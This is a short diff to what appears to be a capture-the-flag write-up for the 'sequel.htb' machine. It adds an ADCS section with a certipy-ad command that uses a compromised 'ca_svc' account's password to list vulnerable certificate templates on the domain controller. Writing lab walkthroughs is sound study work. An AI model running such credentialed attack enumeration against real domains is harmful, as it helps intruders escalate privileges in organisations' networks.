@@ -509,3 +509,9 @@ SMB         10.129.232.128  445    DC01             [+] sequel.htb\ca_svc:Passwo
 
 I now have compromised the `ca_svc` account
 
+# ADCS
+
+```python
+certipy-ad find -u ca_svc@sequel.htb -p 'Password123!' -stdout -target 'dc01.sequel.htb' -vulnerable
+```
+
